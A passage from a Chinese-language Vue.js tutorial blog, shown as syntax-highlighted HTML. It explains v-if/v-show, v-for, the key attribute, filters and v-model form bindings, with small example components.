class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">"isTrue"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>请输入用户名<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>请输入邮箱<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入邮箱"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"c"</span>&gt;</span>切换登录方式<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      isTrue: <span class="literal">true</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      c()&#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.isTrue = !<span class="keyword">this</span>.isTrue</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>出现的小问题：</strong></p><p>如果我们在有输入内容的情况下，切换了类型，我们会发现文字依然显示之前的输入的内容。</p><p>但是按道理讲，我们应该切换到另外一个input元素中了。</p><p>在另一个input元素中，我们并没有输入内容。</p><p>为什么会出现这个问题呢？</p><p><strong>问题解答：</strong></p><p>这是因为Vue在进行DOM渲染时，出于性能考虑，会尽可能的复用已经存在的元素，而不是重新创建新的元素。</p><p>在案例中，Vue内部会发现原来的input元素不再使用，直接作为else中的input来使用了。</p><p><strong>解决方案：</strong></p><p>如果我们不希望Vue出现类似重复利用的问题，可以给对应的input添加key</p><p>并且我们需要保证key的不同</p><p><strong>解决主要代码</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 问题：在点击登录切换后，原先在文本框输入的内容还是会保留（涉及到vue底层，虚拟DOM的问题)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-if</span>=<span class="string">"isTrue"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>请输入用户名<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 解决方法：在控件后面添加key关键字 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">key</span>=<span class="string">"username"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h5</span>&gt;</span>请输入邮箱<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入邮箱"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"c"</span>&gt;</span>切换登录方式<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      isTrue: <span class="literal">true</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      c()&#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.isTrue = !<span class="keyword">this</span>.isTrue</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h2><p>v-show的用法和v-if非常相似，也用于决定一个元素是否渲染：</p><p><strong>v-if和v-show对比</strong></p><p>v-if和v-show都可以决定一个元素是否渲染</p><p>v-if当条件为false时，压根不会有对应的元素在DOM中。</p><p>v-show当条件为false时，仅仅是将元素的display属性设置为none而已。</p><p><strong>开发中的选择</strong></p><p>当需要在显示与隐藏之间切换很频繁时，使用v-show</p><p>当只有一次切换时，通过使用v-if</p><p><strong>案例</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 隐藏而非去除元素，相当于display:none --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">"a"</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data:&#123;</span><br><span class="line"><span class="actionscript">      a: <span class="literal">false</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="遍历循环"><a href="#遍历循环" class="headerlink" title="遍历循环"></a>遍历循环</h1><h2 id="v-for遍历数组"><a href="#v-for遍历数组" class="headerlink" title="v-for遍历数组"></a>v-for遍历数组</h2><p>v-for=”(项, 索引号) in 数组”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.遍历数组中的每个项 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in fruits"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2.遍历数组中的值和索引 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item, index) in fruits"</span>&gt;</span>&#123;&#123;++index +'-'+item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">"#app"</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      fruits:[<span class="string">'火龙果'</span>,<span class="string">'橙子'</span>,<span class="string">'香蕉'</span>,<span class="string">'西瓜'</span>,<span class="string">'栗子'</span>,<span class="string">'苹果'</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="v-for遍历对象"><a href="#v-for遍历对象" class="headerlink" title="v-for遍历对象"></a>v-for遍历对象</h2><p>v-for=”(值, 键, 索引) in 对象”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.遍历对象中的每个值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in fruits"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2.遍历对象的键值对 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item, key) in fruits"</span>&gt;</span>&#123;&#123;key +'-'+item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 3.遍历对象的键值对和索引 不常用--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(item, key, index) in fruits"</span>&gt;</span>&#123;&#123;++index + '-'+key +'-'+item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">"#app"</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line">    fruits: &#123;</span><br><span class="line"><span class="actionscript">      name: <span class="string">"火龙果"</span>,</span></span><br><span class="line"><span class="actionscript">      qualityGuaranteePeriod: <span class="string">"30天"</span>,</span></span><br><span class="line"><span class="actionscript">      producingArea: <span class="string">"China"</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="组件的key属性"><a href="#组件的key属性" class="headerlink" title="组件的key属性"></a>组件的key属性</h2><p><strong>作用</strong>：<strong>key的作用主要是为了高效的更新虚拟DOM</strong></p><h2 id="为什么需要key属性"><a href="#为什么需要key属性" class="headerlink" title="为什么需要key属性"></a>为什么需要key属性</h2><p>这个其实和Vue的虚拟DOM的Diff算法有关系。</p><p>这里我们借用<a href="https://link.zhihu.com/?target=https://calendar.perfplanet.com/2013/diff/">React’s</a><a href="https://link.zhihu.com/?target=https://calendar.perfplanet.com/2013/diff/"> diff algorithm</a>中的一张图来简单说明一下：</p><p>当某一层有很多相同的节点时，也就是列表节点时，我们希望插入一个新的节点</p><p>我们希望可以在B和C之间加一个F，Diff算法默认执行起来是这样的。即把C更新成F，D更新成C，E更新成D，最后再插入E，是不是很没有效率？</p><p>而如果有key属性，则每个值会与对应的key属性一一绑定，那么这个默认算法也就不再执行，而是通过像键值对一样的方式去匹配这些数据，保证代码的高效率</p><p><img src= "/img/loading.gif" data-src="/2021/03/01/%E4%BA%8C%E3%80%81Vue%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/image-20200909164718380.png" alt="image-20200909164718380"></p><h2 id="🔺vue中的数据是响应式的"><a href="#🔺vue中的数据是响应式的" class="headerlink" title="🔺vue中的数据是响应式的"></a>🔺vue中的数据是响应式的</h2><ul><li><p>因为Vue是响应式的，所以当数据发生变化时，Vue会自动检测数据变化，视图会发生对应的更新。</p></li><li><p><strong>🔺根据索引修改数组数据是不能成功的，要么通过vue自带方法Vue.set(修改对象，修改索引，修改后的值)去修改数组数据，要么使用splice()方法修改</strong></p></li><li><p>Vue中包含了一组观察数组编译的方法，使用它们改变数组也会触发视图的更新</p><ul><li>push()</li><li>pop()</li><li>shift()</li><li>unshift()</li><li>splice()</li><li>sort()</li><li>reverse()</li></ul></li></ul><h3 id="splice"><a href="#splice" class="headerlink" title="splice()"></a>splice()</h3><p><strong>简介：</strong>可以删除、修改、替换元素</p><p><strong>格式：</strong>目标数组.splice(开始索引位置，删除（替换)元素个数，…元素（插入替换的元素））</p><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><p><strong>filters</strong> <a href="https://cn.vuejs.org/v2/guide/filters.html" target="_blank" rel="noopener">官网介绍</a></p><p><strong>作用：</strong>用于一些常见的文本格式化（过滤到你做想要的数据结果格式）</p><ol><li><p>在html中定义过滤器</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.price | price&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>vue对象中编写过滤器的具体实现方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filters: &#123;</span><br><span class="line">  price(p) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'￥'</span> + p.toFixed(<span class="number">2</span>)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h1><p><strong>前言：</strong> 表单控件在实际开发中是非常常见的。特别是对于用户信息的提交，需要大量的表单。</p><p><strong>作用：</strong>Vue中使用v-model指令来实现表单元素和数据的双向绑定。</p><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>当我们使用text控件并绑定某个数据时，修改text的输入内容时，相应的，这个数据也会被修改，同时，这个修改完后的数据也可以在其他地方渲染出来，这个时候，就实现了<strong>双向绑定</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      message: <span class="string">'你好啊'</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="原理-v-on结合v-bind"><a href="#原理-v-on结合v-bind" class="headerlink" title="原理(v-on结合v-bind)"></a>原理(v-on结合v-bind)</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- input控件包含input事件，当对该控件操作时会有相应的反应 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">:value</span>=<span class="string">"message"</span> <span class="attr">v-on:input</span>=<span class="string">"change"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- &lt;input type="text" :value="message" @input="change"&gt; --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      message: <span class="string">'你好啊'</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      change(event) &#123;</span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.message = event.target.value <span class="comment">//获取到文本框输入数据</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="结合radio使用"><a href="#结合radio使用" class="headerlink" title="结合radio使用"></a>结合radio使用</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- for用来绑定与该label标签关联的控件 name属性用来确定控件名称，以达到互斥效果--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"male"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"男"</span> <span class="attr">id</span>=<span class="string">"male"</span> <span class="attr">v-model</span>=<span class="string">"sex"</span>&gt;</span>男</span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"female"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"女"</span> <span class="attr">id</span>=<span class="string">"female"</span> <span class="attr">v-model</span>=<span class="string">"sex"</span>&gt;</span>女</span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">"sex.length === 1"</span>&gt;</span>你选择的性别是&#123;&#123;sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-else</span>&gt;</span>&#123;&#123;sex&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>s</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      sex: <span class="string">'请选择你的性别'</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="结合checkbox使用"><a href="#结合checkbox使用" class="headerlink" title="结合checkbox使用"></a>结合checkbox使用</h2><ol><li>单个勾选框<ul><li>v-model即为布尔值。</li><li><strong>input的value并不影响v-model的值。</strong></li></ul></li><li>多个勾选框<ul><li>当是多个复选框时，因为可以选中多个，所以对应的data中属性是一个数组</li><li>当选中某一个时，就会将input的value添加到数组中</li></ul></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 单选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"agree"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"isAgree"</span> <span class="attr">id</span>=<span class="string">"agree"</span>&gt;</span>同意协议</span><br><span class="line">  <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>你选择的是&#123;&#123;isAgree&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">:disabled</span>=<span class="string">"!isAgree"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 多选框 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"苹果"</span>&gt;</span>苹果</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"栗子"</span>&gt;</span>栗子</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"李子"</span>&gt;</span>李子</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"梨子"</span>&gt;</span>梨子</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"橙子"</span>&gt;</span>橙子</span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">v-model</span>=<span class="string">"fruits"</span> <span class="attr">value</span>=<span class="string">"哈密瓜"</span>&gt;</span>哈密瓜</span><br><span class="line">  <span class="tag">&lt;<span 